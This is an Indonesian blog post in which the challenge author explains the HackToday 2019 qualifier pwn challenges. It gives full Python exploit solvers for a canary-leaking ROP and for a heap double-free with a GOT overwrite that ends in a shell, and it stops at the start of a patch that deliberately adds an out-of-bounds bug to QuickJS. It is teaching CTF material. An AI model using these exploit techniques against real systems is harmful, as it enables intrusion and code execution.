<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><title>HackToday 2019 Quals - pwn | circleous</title><link rel=stylesheet href=/css/main.min.a16339a5d57f8df4724d41efd02e48d0023feb1e3934721f39cbdc1bb1a12b31.css integrity="sha256-oWM5pdV/jfRyTUHv0C5I0AI/6x45NHIfOcvcG7GhKzE=" crossorigin=anonymous><link rel=stylesheet href=/css/codes.min.212a1080bdb9f68724a4aff8ef71b5bf08e662a8f5ef70b13d4d94330d804899.css integrity="sha256-ISoQgL259ockpK/473G1vwjmYqj173CxPU2UMw2ASJk=" crossorigin=anonymous></head><body><header><h1><a href=/>circleous</a></h1><nav><ul><li><a href=/>Home</a></li><li><a aria-current=true class=ancestor href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li></ul></nav></header><main><article><header><h1>HackToday 2019 Quals - pwn</h1><time datetime=2019-08-26T00:00:00+07:00>August 26, 2019</time></header><p>Ini akan menjadi seri ke-tiga pada seri <em>writeup</em> HackToday 2019, kali ini saya akan menulis beberapa editorial untuk soal-soal pwn pada kualifikasi HackToday 2019.</p><h2 id=ezrop>ezrop</h2><p>Desain awal soal sebenarnya benar-benar sederhana, key value memory database system, dimana seseorang dapat melihat/mengubah isi value dari suatu key dan posisinya bisa <em>out-of-bound</em>. Yep, tanpa perubahan apapun pada isi memorynya. Tidak tahu kapan persis mulainya, tapi saya merasa soal ini terlalu mudah sehingga mengalami banyak perubahan yang membuat ini tidak benar-benar &ldquo;ez&rdquo;. Puncak kerumitannya, yang harus dilakukan adalah leak value canary lewat auxiliary vector<a href=https://www.gnu.org/software/libc/manual/html_node/Auxiliary-Vector.html>[1]</a><a href=https://lwn.net/Articles/519085/>[2]</a> karena saya mem-<em>poison</em> hampir semua value di memory serta pie+offset tepat pada RBP (leak PIE jadi tidak berguna disini). Beberapa hari sebelum kualifikasi dimulai, saya tersadar, ini soal &ldquo;ez&rdquo;, jadilah perubahan final soal ini, tanpa adanya <em>poison</em> pada value pada RBP. Sebagai gambaran, ini yang terjadi ketika sebelum perubahan final terjadi,</p><pre><code>+----------+----------+
| rand     | rand     |
+----------+----------+
| rand     | canary   |
+----------+----------+
| rand     | libc_ret |
+----------+----------+
| ......   | ......   |
+----------+----------+
</code></pre><p>Kalau yang terjadi adalah seperti di atas, yang harus dilakukan adalah mendapatkan canary dari <code>AT_RADOM</code>, aux vector entry nomor 25.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#414868;font-style:italic>#define AT_RANDOM        25                </span><span style=color:#414868;font-style:italic>/* Address of 16 random bytes.  */</span><span style=color:#414868;font-style:italic>
</span></span></span></code></pre></div><p>Yep, <code>AT_RANDOM</code> pun tidak langsung memberikan CANARY value karena ini adalah pointer ke random bytes di memory. Cara satu-satunya adalah terus menelursuri key-val chain hingga didapat CANARY-nya. Kalau dilihat lagi, <code>AT_RADOM</code> sendiri mengarah pada memory diantara auxv dan environment. Terdengar rumit, tapi <em>doable</em> untuk soal yang straightforward seperti ini. Bagaimana pun juga, ini soal dengan nama &ldquo;ez&rdquo;, jadi saya langsung mengurangi tingkat ke rumitannya dengan mengubah alur program tanpa <em>poison</em> memory pada RBP. Kalau seperti itu yang terjadi adalah seperti berikut.</p><pre><code>+----------+----------+
| rand     | rand     |
+----------+----------+
| rand     | canary   |
+----------+----------+
| pie+off  | libc_ret |
+----------+----------+
| ......   | ......   |
+----------+----------+
</code></pre><p>dengan begitu, hanya dengan leak pie offset melalui <code>AT_PHDR</code> (auxv 3), seharusnya sudah dapat mengontrol value saved RIP melalui key-val system ini. btw, dari semua write-up yang dikirim ke panitia, sepertinya tidak ada satu pun tim yang menyadari keberadaan aux vector disini, sad. Full solver,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#414868;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#7dcfff>from</span> <span style=color:#e0af68>pwn</span> <span style=color:#7dcfff>import</span> <span style=color:#9ece6a;font-weight:700>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># context.terminal = [&#39;tmux&#39;, &#39;split-window&#39;, &#39;-h&#39;]</span>
</span></span><span style=display:flex><span>context<span style=color:#9ece6a;font-weight:700>.</span>log_level <span style=color:#9ece6a;font-weight:700>=</span> [<span style=color:#9ece6a>&#39;debug&#39;</span>, <span style=color:#9ece6a>&#39;info&#39;</span>, <span style=color:#9ece6a>&#39;warn&#39;</span>][<span style=color:#e0af68>1</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BINARY <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;./challenge/ezrop&#39;</span>
</span></span><span style=display:flex><span>HOST <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#34;not.codepwnda.id&#34;</span>
</span></span><span style=display:flex><span>PORT <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>30000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#9ece6a;font-weight:700>=</span> tube; elf <span style=color:#9ece6a;font-weight:700>=</span> ELF; libc <span style=color:#9ece6a;font-weight:700>=</span> ELF
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>find_canary</span>():
</span></span><span style=display:flex><span>    tmp <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>15</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>for</span> _ <span style=color:#9ece6a;font-weight:700>in</span> <span style=color:#9ece6a>range</span>(<span style=color:#e0af68>4</span>):
</span></span><span style=display:flex><span>        r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>str</span>(tmp))
</span></span><span style=display:flex><span>        r<span style=color:#9ece6a;font-weight:700>.</span>recvuntil(<span style=color:#9ece6a>&#39; = &#39;</span>)
</span></span><span style=display:flex><span>        tmp <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>int</span>(r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>), <span style=color:#e0af68>16</span>)
</span></span><span style=display:flex><span>        r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>        r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>str</span>(tmp))
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>recvuntil(<span style=color:#9ece6a>&#39; = &#39;</span>)
</span></span><span style=display:flex><span>    tmp <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>int</span>(r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>), <span style=color:#e0af68>16</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    canary <span style=color:#9ece6a;font-weight:700>=</span> tmp <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xFFFFFFFFFFFF0000</span>
</span></span><span style=display:flex><span>    canary <span style=color:#9ece6a;font-weight:700>&gt;&gt;=</span> <span style=color:#e0af68>8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>str</span>(tmp))
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>recvuntil(<span style=color:#9ece6a>&#39; = &#39;</span>)
</span></span><span style=display:flex><span>    tmp <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>int</span>(r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>), <span style=color:#e0af68>16</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    canary <span style=color:#9ece6a;font-weight:700>|=</span> (tmp <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xFF</span>) <span style=color:#9ece6a;font-weight:700>&lt;&lt;</span> <span style=color:#e0af68>56</span>
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> canary
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>exploit</span>(REMOTE):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>recvuntil(<span style=color:#9ece6a>&#39; = &#39;</span>)
</span></span><span style=display:flex><span>    at_phdr <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>int</span>(r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>), <span style=color:#e0af68>16</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    elf<span style=color:#9ece6a;font-weight:700>.</span>address <span style=color:#9ece6a;font-weight:700>=</span> at_phdr <span style=color:#9ece6a;font-weight:700>-</span> <span style=color:#e0af68>0x40</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    info(<span style=color:#9ece6a>&#39;AT_PHDR </span><span style=color:#9ece6a>%X</span><span style=color:#9ece6a>&#39;</span> <span style=color:#9ece6a;font-weight:700>%</span> (at_phdr))
</span></span><span style=display:flex><span>    info(<span style=color:#9ece6a>&#39;PIE_BASE </span><span style=color:#9ece6a>%X</span><span style=color:#9ece6a>&#39;</span> <span style=color:#9ece6a;font-weight:700>%</span> (elf<span style=color:#9ece6a;font-weight:700>.</span>address))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> <span style=color:#9ece6a;font-weight:700>not</span> REMOTE: gdb<span style=color:#9ece6a;font-weight:700>.</span>attach(r, <span style=color:#9ece6a>&#39;b *</span><span style=color:#9ece6a>{}</span><span style=color:#9ece6a>&#39;</span><span style=color:#9ece6a;font-weight:700>.</span>format(elf<span style=color:#9ece6a;font-weight:700>.</span>address <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>0xd40</span>))
</span></span><span style=display:flex><span>    canary <span style=color:#9ece6a;font-weight:700>=</span> find_canary()
</span></span><span style=display:flex><span>    info(<span style=color:#9ece6a>&#39;CANARY </span><span style=color:#9ece6a>%X</span><span style=color:#9ece6a>&#39;</span> <span style=color:#9ece6a;font-weight:700>%</span> (canary))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>str</span>(canary))
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>recvuntil(<span style=color:#9ece6a>&#39; = &#39;</span>)
</span></span><span style=display:flex><span>    tmp <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>int</span>(r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>), <span style=color:#e0af68>16</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>str</span>(tmp))
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>recvuntil(<span style=color:#9ece6a>&#39; = &#39;</span>)
</span></span><span style=display:flex><span>    libc_start_main_ret <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>int</span>(r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>), <span style=color:#e0af68>16</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;n&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    info(<span style=color:#9ece6a>&#39;LIBC_START_MAIN_RET </span><span style=color:#9ece6a>%X</span><span style=color:#9ece6a>&#39;</span> <span style=color:#9ece6a;font-weight:700>%</span> (libc_start_main_ret))
</span></span><span style=display:flex><span>    libc<span style=color:#9ece6a;font-weight:700>.</span>address <span style=color:#9ece6a;font-weight:700>=</span> ((libc_start_main_ret <span style=color:#9ece6a;font-weight:700>-</span> libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;__libc_start_main&#39;</span>]) <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xFFFFFFFFFFFFF000</span>) <span style=color:#9ece6a;font-weight:700>+</span> libc<span style=color:#9ece6a;font-weight:700>.</span>address
</span></span><span style=display:flex><span>    info(<span style=color:#9ece6a>&#39;LIBC_BASE </span><span style=color:#9ece6a>%X</span><span style=color:#9ece6a>&#39;</span> <span style=color:#9ece6a;font-weight:700>%</span> (libc<span style=color:#9ece6a;font-weight:700>.</span>address))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># ROP ALL THE WAY DOWN</span>
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>str</span>(tmp))
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;y&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>str</span>(elf<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;flag&#39;</span>]))
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>&#39;y&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>if</span> __name__ <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#9ece6a>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    REMOTE <span style=color:#9ece6a;font-weight:700>=</span> os<span style=color:#9ece6a;font-weight:700>.</span>getenv(<span style=color:#9ece6a>&#39;REMOTE&#39;</span>)
</span></span><span style=display:flex><span>    elf <span style=color:#9ece6a;font-weight:700>=</span> ELF(BINARY, checksec<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>False</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> REMOTE:
</span></span><span style=display:flex><span>        r <span style=color:#9ece6a;font-weight:700>=</span> remote(HOST, PORT)
</span></span><span style=display:flex><span>        libc <span style=color:#9ece6a;font-weight:700>=</span> ELF(<span style=color:#9ece6a>&#39;/home/kyra/git/libc-database/db/libc6_2.23-0ubuntu10_amd64.so&#39;</span>, checksec<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>else</span>:
</span></span><span style=display:flex><span>        r <span style=color:#9ece6a;font-weight:700>=</span> elf<span style=color:#9ece6a;font-weight:700>.</span>process(aslr<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>1</span>)
</span></span><span style=display:flex><span>        libc <span style=color:#9ece6a;font-weight:700>=</span> r<span style=color:#9ece6a;font-weight:700>.</span>libc
</span></span><span style=display:flex><span>        info(r<span style=color:#9ece6a;font-weight:700>.</span>pid)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    exploit(REMOTE)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>interactive()
</span></span></code></pre></div><h2 id=leakless>leakless</h2><p><img src=hacktoday-leakless.png alt=leakless><em>a pun from IDA, no undo, no surrender.</em></p><p>classical heap note problem, dimana terdapat double-free tanpa ada fungsi <code>view()</code> untuk note yang dibuat. Ada beberapa cara yang dapat dilakukan untuk mengotrol RIP sehingga mendapatkan shell dan untuk mendapatkan leak. Namun dari beberapa writeup yang saya baca, hampir semua mengganti GOT table <code>free</code> ke <code>PLT.printf</code> untuk digunakan sebagai format string. Saya sendiri mengubah GOT <code>atoi</code> ke <code>printf</code>. Full solver,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#414868;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#7dcfff>from</span> <span style=color:#e0af68>pwn</span> <span style=color:#7dcfff>import</span> <span style=color:#9ece6a;font-weight:700>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context<span style=color:#9ece6a;font-weight:700>.</span>terminal <span style=color:#9ece6a;font-weight:700>=</span> [<span style=color:#9ece6a>&#39;tmux&#39;</span>, <span style=color:#9ece6a>&#39;split-window&#39;</span>, <span style=color:#9ece6a>&#39;-h&#39;</span>]
</span></span><span style=display:flex><span>context<span style=color:#9ece6a;font-weight:700>.</span>log_level <span style=color:#9ece6a;font-weight:700>=</span> [<span style=color:#9ece6a>&#39;debug&#39;</span>, <span style=color:#9ece6a>&#39;info&#39;</span>, <span style=color:#9ece6a>&#39;warn&#39;</span>][<span style=color:#e0af68>1</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BINARY <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;./release/chall&#39;</span>
</span></span><span style=display:flex><span>HOST <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#34;not.codepwnda.id&#34;</span>
</span></span><span style=display:flex><span>PORT <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>30001</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#9ece6a;font-weight:700>=</span> tube; elf <span style=color:#9ece6a;font-weight:700>=</span> ELF; libc <span style=color:#9ece6a;font-weight:700>=</span> ELF
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>create</span>(size, msg, edited<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>False</span>):
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendafter(<span style=color:#9ece6a>&#39;&gt; &#39;</span>, <span style=color:#9ece6a>&#39;1&#39;</span> <span style=color:#bb9af7>if</span> <span style=color:#9ece6a;font-weight:700>not</span> edited <span style=color:#bb9af7>else</span> <span style=color:#9ece6a>&#39; </span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>str</span>(size) <span style=color:#bb9af7>if</span> <span style=color:#9ece6a;font-weight:700>not</span> edited <span style=color:#bb9af7>else</span> <span style=color:#9ece6a>&#39;%</span><span style=color:#9ece6a>{}</span><span style=color:#9ece6a>c</span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span><span style=color:#9ece6a;font-weight:700>.</span>format(size))
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendafter(<span style=color:#9ece6a>&#39;: &#39;</span>, <span style=color:#9ece6a>str</span>(msg))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>delete</span>(edited<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>False</span>):
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendafter(<span style=color:#9ece6a>&#39;&gt; &#39;</span>, <span style=color:#9ece6a>&#39;2&#39;</span> <span style=color:#bb9af7>if</span> <span style=color:#9ece6a;font-weight:700>not</span> edited <span style=color:#bb9af7>else</span> <span style=color:#9ece6a>&#39;  </span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>exploit</span>(REMOTE):
</span></span><span style=display:flex><span>    create(<span style=color:#e0af68>0x38</span>, <span style=color:#9ece6a>&#39;/bin/sh&#39;</span>)
</span></span><span style=display:flex><span>    create(<span style=color:#e0af68>0x18</span>, <span style=color:#9ece6a>&#39;B&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x18</span>)
</span></span><span style=display:flex><span>    delete()
</span></span><span style=display:flex><span>    delete()
</span></span><span style=display:flex><span>    create(<span style=color:#e0af68>0x18</span>, p64(elf<span style=color:#9ece6a;font-weight:700>.</span>got[<span style=color:#9ece6a>&#39;atoi&#39;</span>]))
</span></span><span style=display:flex><span>    create(<span style=color:#e0af68>0x18</span>, p8(<span style=color:#e0af68>0x00</span>))
</span></span><span style=display:flex><span>    create(<span style=color:#e0af68>0x18</span>, p64(elf<span style=color:#9ece6a;font-weight:700>.</span>plt[<span style=color:#9ece6a>&#39;printf&#39;</span>]))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;%19$p&#39;</span>
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;&gt; &#39;</span>, payload)
</span></span><span style=display:flex><span>    libc<span style=color:#9ece6a;font-weight:700>.</span>address <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#9ece6a>int</span>(r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>False</span>), <span style=color:#e0af68>16</span>) <span style=color:#9ece6a;font-weight:700>-</span> libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;__libc_start_main&#39;</span>]) <span style=color:#9ece6a;font-weight:700>&amp;</span> <span style=color:#e0af68>0xFFFFFFFFFFFFF000</span>
</span></span><span style=display:flex><span>    info(<span style=color:#9ece6a>&#39;</span><span style=color:#9ece6a>%x</span><span style=color:#9ece6a>&#39;</span> <span style=color:#9ece6a;font-weight:700>%</span> libc<span style=color:#9ece6a;font-weight:700>.</span>address)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    create(<span style=color:#e0af68>0x28</span>, <span style=color:#9ece6a>&#39;C&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x28</span>, <span style=color:#e0af68>1</span>)
</span></span><span style=display:flex><span>    delete(<span style=color:#e0af68>1</span>)
</span></span><span style=display:flex><span>    delete(<span style=color:#e0af68>1</span>)
</span></span><span style=display:flex><span>    create(<span style=color:#e0af68>0x28</span>, p64(elf<span style=color:#9ece6a;font-weight:700>.</span>got[<span style=color:#9ece6a>&#39;atoi&#39;</span>]), <span style=color:#e0af68>1</span>)
</span></span><span style=display:flex><span>    create(<span style=color:#e0af68>0x28</span>, p64(<span style=color:#e0af68>0x00</span>), <span style=color:#e0af68>1</span>)
</span></span><span style=display:flex><span>    create(<span style=color:#e0af68>0x28</span>, p64(libc<span style=color:#9ece6a;font-weight:700>.</span>sym[<span style=color:#9ece6a>&#39;system&#39;</span>]), <span style=color:#e0af68>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendafter(<span style=color:#9ece6a>&#39;&gt; &#39;</span>, <span style=color:#9ece6a>&#39;/bin/sh</span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>if</span> __name__ <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#9ece6a>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    REMOTE <span style=color:#9ece6a;font-weight:700>=</span> os<span style=color:#9ece6a;font-weight:700>.</span>getenv(<span style=color:#9ece6a>&#39;REMOTE&#39;</span>)
</span></span><span style=display:flex><span>    elf <span style=color:#9ece6a;font-weight:700>=</span> ELF(BINARY, checksec<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>False</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> REMOTE:
</span></span><span style=display:flex><span>        libc <span style=color:#9ece6a;font-weight:700>=</span> ELF(<span style=color:#9ece6a>&#39;libc-2.27.so&#39;</span>, checksec<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>False</span>)
</span></span><span style=display:flex><span>        r <span style=color:#9ece6a;font-weight:700>=</span> remote(HOST, PORT)
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>else</span>:
</span></span><span style=display:flex><span>        libc <span style=color:#9ece6a;font-weight:700>=</span> ELF(<span style=color:#9ece6a>&#39;/opt/glibc/x64/2.26/lib/libc.so.6&#39;</span>, checksec<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>False</span>)
</span></span><span style=display:flex><span>        r <span style=color:#9ece6a;font-weight:700>=</span> elf<span style=color:#9ece6a;font-weight:700>.</span>process(aslr<span style=color:#9ece6a;font-weight:700>=</span><span style=color:#e0af68>True</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    exploit(REMOTE)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>interactive()
</span></span></code></pre></div><h2 id=quickie>quickie</h2><p>Awalnya soal terakhir pwn untuk kualifikasi ini menyangkut hal JIT type confusion pada WebKit, mengikuti LiveOverflow hype pada seriesnya di YouTube, pwning WebKit. Setelah diukur waktu pengerjaannya, 6~7 jam pengerjaan untuk entry level CTF itu tidak memungkinkan. Akhirnya, mengikuti style speedrun DEF CON, saya membuat soal out-of-bound dari salah satu mini js engine yang ada. Yang saya pilih adalah <a href=https://bellard.org/quickjs/>QuickJS dari Fabrice Bellard</a> karena duktape sudah lumayan banyak digunakan untuk beberapa CTF sebelumnya (DEFCON, midnight, etc.). patchset yang diberikan, <code>0001-QuickJS-enable-OOB.patch</code>,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span><span style=color:#e0af68;font-weight:700>diff --git quickjs.c quickjs.c
</span></span></span><span style=display:flex><span><span style=color:#e0af68;font-weight:700>index 9606455..c81b450 100644
</span></span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>--- quickjs.c
</span></span></span><span style=display:flex><span><span style=color:#9ece6a;background-color:#15161e>+++ quickjs.c
